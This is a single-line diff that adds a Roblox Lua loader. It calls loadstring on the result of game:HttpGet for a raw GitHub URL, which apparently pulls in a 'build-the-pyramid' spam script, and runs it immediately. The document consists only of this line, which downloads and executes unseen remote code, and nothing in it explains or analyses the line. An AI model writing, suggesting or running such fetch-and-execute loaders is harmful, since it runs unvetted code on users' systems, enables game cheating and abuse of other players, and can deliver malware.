@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/build-the-pyramid-spam6-3mgxj7qbhqm59e.lua"))()
